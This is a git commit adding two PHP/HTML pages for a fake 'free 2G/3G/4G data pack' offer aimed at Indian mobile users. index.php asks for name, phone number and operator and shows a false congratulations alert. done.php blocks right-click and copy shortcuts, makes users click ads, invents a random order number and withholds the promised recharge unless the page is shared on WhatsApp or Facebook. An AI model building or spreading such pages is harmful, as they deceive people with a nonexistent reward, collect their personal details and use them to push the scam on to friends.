2e57b1c7a4476d84c5a51187c4d175d79516b5c5
rashid2547 <64259327+rashid2547@users.noreply.github.com>
2021-05-05 16:20:26 +0530

    git

---
+++ done.php
@@ -0,0 +1,150 @@
+
+
+
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+ <meta property="og:locale" content="en" />
+<title>Earn 10GB | 2G/3G/4G Data Pack FREE.</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+     <link rel="shortcut icon" href="/sicon.png" type="image/x-icon">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="../www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" type="text/css" href="/css/min.css"/>
+</head>
+	<SCRIPT language=JavaScript>
+
+
+var message = "You have not Permission to This";
+
+function rtclickcheck(keyp){ if (navigator.appName == "Netscape" && keyp.which == 3){ alert(message); return false; }
+
+if (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2) { alert(message); return false; } }
+
+document.onmousedown = rtclickcheck;
+
+</SCRIPT><script>
+document.onkeydown = function(e) {
+        if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
+            
+        }
+        return false;
+};
+</script>
+<script>
+function setCookie(cname, cvalue, exdays) {
+var d = new Date();
+d.setTime(d.getTime() + (exdays*24*60*60*1000));
+var expires = "expires="+d.toUTCString();
+document.cookie = cname + "=" + cvalue + "; " + expires;
+}
+
+function getRandomString()
+{
+  var text = "";
+  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+  for (var i = 0; i < 5; i++)
+    text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+  return text;
+}
+
+
+function getCookie(cname) {
+var name = cname + "=";
+var ca = document.cookie.split(';');
+for(var i=0; i<ca.length; i++) {
+var c = ca[i];
+while (c.charAt(0)==' ') c = c.substring(1);
+if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
+}
+return 0;
+}
+var c=getCookie("clicks");
+function fn1(x)
+{
+++c;
+setCookie("clicks",c,4);
+if(false && c < 4)
+{
+window.alert("You have not open our offer link in your mobile.\n Please open it.");
+}
+else
+window.alert("Thank you Using Our Site. \n\nWe have received your Recharge request. \n\nYour order number is "+getRandomString()+". \n\nRecharge will be completed in the next 3 Days.\n\nIf you haven't shared on whatsapp or facebook, you will not get Recharge.\n\nRemember : Don't delete the messages or post until order confirmation.")
+}
+</script>
+
+<script type="text/javascript">navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;navigator.vibrate([1000, 500]);</script>       
+    </head>
+    
+
+<body>
+
+
+<script>
+function setCookie1(e,t,n)
+{
+var i=new Date;
+i.setTime(i.getTime()+24*n*60*60*1e3)
+;var o="expires="+i.toUTCString();
+document.cookie=e+"="+t+"; "+o
+}
+
+function getCookie1(e)
+{for(var t=e+"=",n=document.cookie.split(";"),i=0;i<n.length;i++){for(var o=n[i];" "==o.charAt(0);)o=o.substring(1);if(0==o.indexOf(t))return o.substring(t.length,o.length)}return 0}
+</script>
+    <a href="#" id="b1" onclick="fn1(this);return false;"></a>
+
+
+<div class="content">
+ 
+    
+<div class="container2">
+<header>
+    <div class="h_logo">
+        <img src="logo.jpg" height="auto" />
+    </div>
+    <h1>Done Just Complete Some Stapes</h1>	
+</header>
+
+
+<div class="container">
+       		
+                <b>
+
+                
+                         1. Click Any Ads In This Page And W8 50 Sec.<br><br>
+                         2. Then Come Back And Click On Send Now.
+
+
+                    </p>
+                    
+              
+               
+
+                <div class="form-step">
+		      
+            	
+		 
+                    <a style="width:100%; text-align:center; display:block" target="_blank"  href="javascript:return void(0);" class="whatsapp" target="_blank"
+ onClick="javascript:window.open('http://mobgyan.com');"
+ id="signInSubmit" unselectable="on"> 
+                    </a><br><br>
+                    
+                 <br><br>
+  <a style="width:100%; text-align:center; display:block; margin-top:10px;" class="step last" onclick="fn1(this)">
+                        Send Now    
+                    </a>
+
+ <center>
+<br>
+<MARQUEE BEHAVIOR=SCROLL>
+<font color="red"><b>(Share it more and more so that everyone can benefit from this scheme.)<b></b></font></MARQUEE>
+</center>  
+
+ 
+</body>
+</html>
---
+++ index.php
@@ -0,0 +1,318 @@
+
+<html>
+
+
+<!-- Design By. MobGyan.Com/ by GoProHost Team Website Copier/3.x [XR&CO'2018], Sat, 04 23 2018 2:02:43 GMT -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+<title>Earn 10GB | 2G/3G/4G Data Pack FREE.</title>
+<link href="css/min.css" rel="stylesheet" type="text/css">
+<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
+<link rel="canonical" href="index-2.html">
+	<meta property="og:title" content="Earn Unlimited 2G/3G/4G Data Pack FREE &#10004;"/>
+    <meta property="og:image" content="/ogg.jpg" />
+    <meta property="og:site_name" content="2018 Free Rewards&#10004;"/>
+    <meta property="og:description" content="You have been invited to Earn Unlimited 2G/3G/4G Data Pack!"/>
+	<!-- Meta Name -->
+		<META NAME="rating" CONTENT="general"/>
+	<META NAME="distribution" CONTENT="global"/>
+	<meta name="robots" content="noindex">
+	<META NAME="revisit" CONTENT="3 days"/>
+	<META NAME="expires" CONTENT="never"/>
+	<META NAME="distribution" CONTENT="global"/>
+	<META CONTENT="ALL" NAME="ROBOTS"/>
+	<meta name="owner" content="IPL Rewards!"/>
+	<meta name="language" http-equiv="content-language" content="en"/>
+	<!-- Meta Name End-->
+<body>
+
+<script language=JavaScript>
+<!--
+var message="";
+///////////////////////////////////
+function clickIE() {if (document.all) {(message);return false;}}
+function clickNS(e) {if 
+(document.layers||(document.getElementById&&!document.all)) {
+if (e.which==2||e.which==3) {(message);return false;}}}
+if (document.layers) 
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+
+document.oncontextmenu=new Function("return false")
+// --> 
+</script>
+<script>
+		function setCookie(cname, cvalue, exdays) {
+    var d = new Date();
+    d.setTime(d.getTime() + (exdays*24*60*60*1000));
+    var expires = "expires="+d.toUTCString();
+    document.cookie = cname + "=" + cvalue + "; " + expires;
+} 
+	function getCookie(cname) {
+    var name = cname + "=";
+    var ca = document.cookie.split(';');
+    for(var i=0; i<ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1);
+        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
+    }
+    return 0;
+} 
+	if(getCookie("invites")>0)
+		window.location.href="invite.html";
+	function validate()
+	{
+		var nam=document.getElementById("name").value;
+		var opt=document.getElementById("operator").value;
+		var num=document.getElementById("phone").value;
+		var pak=document.getElementById("pack").value;
+		setCookie("nam",nam,14);
+		setCookie("opt",opt,14);
+		setCookie("num",num,14);
+		setCookie("pak",pak,14);
+	}
+	</script>
+</head>
+
+
+<div class="content">
+ 
+    
+<div class="container2">
+<header>
+    <div class="h_logo">
+        <img src="/logo.jpg" height="auto" />
+    
+    <h1><b><b>You are just 3 Steps Away.</b></b></h1>	</div>
+</header>
+
+
+<center>
+
+    <a href="#" id="b1" onclick="fn1(this)';return false;"></a>
+            
+            
+<div class="left recharge-left">
+      <div id="radio">
+<font color="black">
+					<p>1. Enter Your Correct Detail.</p>
+					<p>2. Share on Whatsapp Friends.</p>
+					<p>3. And Get You Recharge Done.</p></div></div><br>
+              <div class="left recharge-left">
+      <div id="radio">
+        <div class="bm20">
+          
+          <div class="clear">
+   </div>
+        </div>
+        <div id="pre" class="tabContent">
+          <form id="recharge" method="POST" action="/invite.html">
+            <ul class="t-padd25" style="margin-top: 10px;margin-bottom: 10px;">
+              <li class="field">
+                <label ng-class="name ? 'fixed-label' : ''" class="fixed-label">Enter Correct Detail Below</label>
+
+                <input id="name" type="text" ng-class="nameError ? 'error-border':''" ng-model="text" ng-blur="hasPreviousOrders = false;" ng-focus="getPreviousOrders()" name="name" method=POST action=/invite.html  autocomplete="off" text-only="text-only" placeholder="Enter Your Name" class="form-control changeplaceholder showdropdown name ng-pristine ng-valid ng-valid-maxlength ng-touched" required>
+               
+              </li>
+              <li class="field">
+                <label ng-class="number ? 'fixed-label' : ''" class="fixed-label"></label>
+
+                <input id="phone" type="text" ng-class="mobileError ? 'error-border':''" ng-model="number" ng-blur="hasPreviousOrders = false;" ng-focus="getPreviousOrders()" name="phone" method=POST action=/invite.html  autocomplete="off" numbers-only="numbers-only" maxlength="10" placeholder="Enter mobile number" class="form-control changeplaceholder showdropdown number ng-pristine ng-valid ng-valid-maxlength ng-touched" required>
+               
+              </li>
+              <li loop-items1="loop-items1" operator-id="suggestedSearch1" tag-name="div" class="field">
+                <div class="col pb10">
+                  <div class="softblock notification f13"></div>
+                </div>
+                <label ng-class="operatorName ? 'fixed-label' : ''" class="">Select operator</label>
+                <select id="operator" type="select" ng-model="operatorName" ng-class="operatorError ? 'error-border':''" autocomplete="off" placeholder="Select operator" ng-click="showOperators($event);" name="operator" method=POST action=/invite.html class="form-control fetchoperators drpdwn-arrow ng-pristine ng-valid ng-touched" required>
+<option value="">Select Operator</option>
+<option value="Jio">Jio</option>
+<option value="Aircel">Aircel</option>
+<option value="Airtel">Airtel</option>
+<option value="BSNL">BSNL</option>
+<option value="Cheers">Cheers</option>
+<option value="Idea">Idea</option>
+<option value="MTNL">MTNL</option>
+<option value="MTS">MTS</option>
+<option value="Reliance CDMA">Reliance CDMA</option>
+<option value="Reliance GSM">Reliance GSM</option>
+<option value="T24">T24</option>
+<option value="Uninor">Uninor</option>
+<option value="Videocom">Videocon</option>
+<option value="Virgin CDMA">Virgin CDMA</option>
+<option value="Virgin GSM">Virgin GSM</option>
+<option value="Vodafone">Vodafone</option>
+<option value="Other">Other</option>
+</select>
+              </li>
+                <label ng-class="packName ? 'fixed-label' : ''" class="fixed-label"></label>
+<li loop-items1="loop-items1" pack-id="suggestedSearch1" tag-name="div" class="field">
+                <div class="col pb10">
+                  <div class="softblock notification f13"></div>
+                </div>
+              <li class="field">
+                <label ng-class="number ? 'fixed-label' : ''" class="">Select Data Ppack</label>
+                <select id="pack" type="select" ng-model="packName" ng-class="packError ? 'error-border':''" autocomplete="off" placeholder="Select Your Pack" ng-click="showPacks($event);" name="pack" method=POST action=/invite.html class="form-control fetchoperators drpdwn-arrow ng-pristine ng-valid ng-touched" required>
+<option value="">Select Your Pack</option>
+<option value="2G">2G Pack</option>
+<option value="3G">3G Pack</option>
+<option value="4G">4G Pack</option>
+</select></li>
+              
+              
+            </ul>
+            
+            <div class="clear"></div>
+            
+            <div class="clear mb10"></div>
+            <div class="clear"></div>
+            <div class="tp10">
+
+              <button ng-disabled="checkoutDisable ? 'disabled' : ''" data-style="fill" data-horizontal="" onclick="validate()" ng-click="validate()" class="proceedButton btn-4 btn-4c icon-arrow-right btn btn-primary btn-lg btn-block width320 proceedButtonAnimate">
+			  Proceed to Recharge
+			  <span class="progress">
+			  <span ng-style="{width : ( widthProgress + '%' ) }" class="progress-inner">
+			  </span>
+			  </span>
+			  </button>
+            </div>
+          </form>
+          
+          
+          
+          
+          
+          
+          
+          
+          
+        </div>
+      </div>
+    </div>
+    
+            
+            
+             
+        </font>
+        
+   
+        
+		
+		<b style="
+    font-family: sans-serif;
+    -webkit-text-stroke: 0.01px red;
+"></font>
+<div class="left recharge-left">
+      <div id="radio">
+<div id="earn3g"></div>
+
+<script>
+(function () {
+    'use strict';
+    
+    var module = {
+        options: [],
+        header: [navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera],
+        dataos: [
+            { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
+            { name: 'Windows', value: 'Win', version: 'NT' },
+            { name: 'iPhone', value: 'iPhone', version: 'OS' },
+            { name: 'iPad', value: 'iPad', version: 'OS' },
+            { name: 'Kindle', value: 'Silk', version: 'Silk' },
+            { name: 'Android', value: 'Android', version: 'Android' },
+            { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
+            { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
+            { name: 'Macintosh', value: 'Mac', version: 'OS X' },
+            { name: 'Linux', value: 'Linux', version: 'rv' },
+            { name: 'Palm', value: 'Palm', version: 'PalmOS' }
+        ],
+        databrowser: [
+            { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
+            { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
+            { name: 'Safari', value: 'Safari', version: 'Version' },
+            { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
+            { name: 'Opera', value: 'Opera', version: 'Opera' },
+            { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
+            { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
+        ],
+        init: function () {
+            var agent = this.header.join(' '),
+                os = this.matchItem(agent, this.dataos),
+                browser = this.matchItem(agent, this.databrowser);
+            
+            return { os: os, browser: browser };
+        },
+        matchItem: function (string, data) {
+            var i = 0,
+                j = 0,
+                html = '',
+                regex,
+                regexv,
+                match,
+                matches,
+                version;
+            
+            for (i = 0; i < data.length; i += 1) {
+                regex = new RegExp(data[i].value, 'i');
+                match = regex.test(string);
+                if (match) {
+                    regexv = new RegExp(data[i].version + '[- /:;]([\\d._]+)', 'i');
+                    matches = string.match(regexv);
+                    version = '';
+                    if (matches) { if (matches[1]) { matches = matches[1]; } }
+                    if (matches) {
+                        matches = matches.split(/[._]+/);
+                        for (j = 0; j < matches.length; j += 1) {
+                            if (j === 0) {
+                                version += matches[j] + '.';
+                            } else {
+                                version += matches[j];
+                            }
+                        }
+                    } else {
+                        version = '0';
+                    }
+                    return {
+                        name: data[i].name,
+                        version: parseFloat(version)
+                    };
+                }
+            }
+            return { name: 'unknown', version: 0 };
+        }
+    };
+    
+    var e = module.init(),
+        debug = 'Device Information<br/>';
+    
+    debug += '' + e.os.name + '';
+    debug += ' Version = ' + e.os.version + '<br/>';
+    debug += 'Browser Version = ' + e.browser.name + '';
+    debug += ' ' + e.browser.version + '<br/>';
+    
+    debug += '<br/>';
+    debug += 'Device = <font color="red">' + navigator.appVersion + '<br/>';
+    
+    document.getElementById('earn3g').innerHTML = debug;
+}());
+</script>
+</div></div>
+	
+
+
+<script>
+alert("Congratulations. You have been Invited o Earn 2G/3G/4G Data Pack FREE. \n\nClick on OK/I KNOW button");
+</script>
+
+
+
+</div></div>
+
+</center>
+
+
+</body>
+
+<!-- Design By. MobGyan.Com/ by GoProHost Team Website Copier/3.x [XR&CO'2018], Sat, 04 23 2018 2:02:43 GMT -->
+</html>
